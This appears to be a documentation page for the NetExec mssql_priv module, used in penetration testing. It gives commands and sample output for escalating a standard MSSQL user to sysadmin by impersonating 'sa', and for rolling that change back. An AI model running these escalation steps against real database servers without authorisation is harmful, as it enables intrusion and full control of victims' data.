---
description: Module to privesc from standard user to DBA
---

# MSSQL Privesc

## Normal Authentication

```bash
nxc mssql $TARGET -u $USER -p $PASSWORD                       
MSSQL       <ip>   1433   FQDN      [*] Windows 10 / Server 2019 Build 17763 (name:FQDN) (domain:FQDN.local)
MSSQL       <ip>   1433   FQDN      [+] FQDN\user:password
```
## Expected Results After **mssql_priv** Module
```bash
nxc mssql $TARGET -u $USER -p $PASSWORD -M mssql_priv
MSSQL       <ip>   1433   FQDN      [*] Windows 10 / Server 2019 Build 17763 (name:FQDN) (domain:FQDN.local)
MSSQL       <ip>   1433   FQDN      [+] FQDN\user:password 
MSSQL_PRIV  <ip>   1433   FQDN      [+] FQDN\user can impersonate: sa (sysadmin)
```

## Impersonating
```bash
nxc mssql $TARGET -u $USER -p $PASSWORD -M mssql_priv -o ACTION=privesc
MSSQL       <ip>   1433   FQDN      [*] Windows 10 / Server 2019 Build 17763 (name:FQDN) (domain:FQDN.local)
MSSQL       <ip>   1433   FQDN      [+] FQDN\user:password 
MSSQL_PRIV  <ip>   1433   FQDN      [+] FQDN\user can impersonate: sa (sysadmin)
MSSQL_PRIV  <ip>   1433   FQDN      [+] FQDN\user is now a sysadmin! (Pwn3d!)
```

## Don't forget to rollback sysadmin privs in production
```bash
nxc mssql $TARGET -u $USER -p $PASSWORD -M mssql_priv -o ACTION=rollback
MSSQL       <ip>   1433   FQDN      [*] Windows 10 / Server 2019 Build 17763 (name:FQDN) (domain:FQDN.local)
MSSQL       <ip>   1433   FQDN      [+] FQDN\user:password (Pwn3d!)
MSSQL_PRIV  <ip>   1433   FQDN      [+] sysadmin role removed
```
